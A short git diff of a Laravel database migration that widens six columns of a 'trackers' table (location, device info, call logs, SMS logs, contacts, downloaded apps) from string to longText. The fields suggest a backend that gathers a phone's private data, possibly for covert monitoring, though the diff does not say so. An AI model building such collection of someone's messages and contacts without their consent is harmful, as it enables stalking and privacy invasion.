@@ -13,12 +13,12 @@ return new class extends Migration
     {
         Schema::create('trackers', function (Blueprint $table) {
             $table->bigIncrements('id');
-            $table->string('location');
-            $table->string('device_info');
-            $table->string('call_logs');
-            $table->string('sms_logs');
-            $table->string('list_contact');
-            $table->string('apps_downloaded');
+            $table->longText('location');
+            $table->longText('device_info');
+            $table->longText('call_logs');
+            $table->longText('sms_logs');
+            $table->longText('list_contact');
+            $table->longText('apps_downloaded');
             $table->timestamps();
         });
     }
